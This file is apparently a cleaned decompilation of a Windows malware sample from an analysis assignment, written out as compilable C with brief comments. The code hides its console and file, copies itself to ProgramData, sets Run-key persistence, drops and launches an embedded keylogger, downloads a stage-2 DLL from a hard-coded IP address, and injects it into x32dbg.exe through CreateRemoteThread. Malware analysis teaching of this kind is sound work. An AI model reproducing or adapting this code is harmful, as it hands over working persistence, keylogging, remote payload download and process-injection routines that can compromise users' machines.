/* Cleaned / annotated reconstruction of malware_assignment main @ 0x401040
 * Source: Hex-Rays IDA 9.4 — artefacts/ida_export/blocker_gen.c
 * Defensive analysis only.
 */
#include <windows.h>
#include <shlobj.h>
#include <urlmon.h>
#include <tlhelp32.h>
#include <stdio.h>

int main(void)
{
    WCHAR self[MAX_PATH];
    WCHAR dest[MAX_PATH];
    HKEY hk = NULL;
    HRSRC hrsrc;
    HGLOBAL hglob;
    const void *res;
    DWORD res_size, written;
    HANDLE hFile, hSnap, hProc, hThread;
    PROCESSENTRY32W pe;
    DWORD pid = (DWORD)-1;
    LPVOID remote;
    FARPROC pLoadLibraryW;

    /* --- stealth console --- */
    AllocConsole();
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), SW_HIDE); /* 0 */

    /* --- hide own file on disk --- */
    GetModuleFileNameW(NULL, self, MAX_PATH);
    SetFileAttributesW(self, FILE_ATTRIBUTE_HIDDEN); /* 2 */

    /* --- copy to ProgramData\app_data.exe --- */
    SHGetFolderPathW(NULL, CSIDL_COMMON_APPDATA /*35*/, NULL, 0, dest);
    wcscat_s(dest, MAX_PATH, L"\\app_data.exe");
    CopyFileW(self, dest, FALSE);

    /* --- HKCU Run persistence --- */
    SHGetFolderPathW(NULL, CSIDL_COMMON_APPDATA, NULL, 0, self);
    wcscat_s(self, MAX_PATH, L"\\app_data.exe");
    RegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_WRITE, &hk);
    RegSetValueExW(hk, L"Persistence", 0, REG_SZ,
        (BYTE *)self, (DWORD)((wcslen(self) + 1) * sizeof(WCHAR)));
    /* note: sample passes cbData=0x208 (fixed) */
    RegCloseKey(hk);

    /* --- drop embedded keylogger (RCDATA id 101 / 0x65) --- */
    hrsrc = FindResourceW(NULL, MAKEINTRESOURCEW(0x65), RT_RCDATA /*10*/);
    if (hrsrc) {
        hglob = LoadResource(NULL, hrsrc);
        res_size = SizeofResource(NULL, hrsrc);
        res = LockResource(hglob);
        SHGetFolderPathW(NULL, CSIDL_APPDATA /*26*/, NULL, 0, dest);
        wcscat_s(dest, MAX_PATH, L"\\keylogger_hook.exe");
        hFile = CreateFileW(dest, GENERIC_WRITE, FILE_SHARE_READ, NULL,
                            CREATE_ALWAYS, 0, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            WriteFile(hFile, res, res_size, &written, NULL);
            CloseHandle(hFile);
            ShellExecuteW(NULL, L"open", dest, NULL, NULL, SW_SHOWDEFAULT /*10*/);
        }
    }

    /* --- download stage-2 DLL --- */
    URLDownloadToFileW(NULL,
        L"http://210.125.101.75/payload.dll",
        L"C:\\payload.dll", 0, NULL);

    /* --- find x32dbg.exe and inject LoadLibraryW(C:\payload.dll) --- */
    pe.dwSize = sizeof(pe);
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"x32dbg.exe") == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);

    hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    remote = VirtualAllocEx(hProc, NULL, 0x1E,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    WriteProcessMemory(hProc, remote, L"C:\\payload.dll", 0x1E, NULL);
    pLoadLibraryW = GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW");
    hThread = CreateRemoteThread(hProc, NULL, 0,
        (LPTHREAD_START_ROUTINE)pLoadLibraryW, remote, 0, NULL);
    CloseHandle(hThread);
    VirtualFreeEx(hProc, remote, 0x1E, MEM_RELEASE);
    CloseHandle(hProc);
    return 0;
}
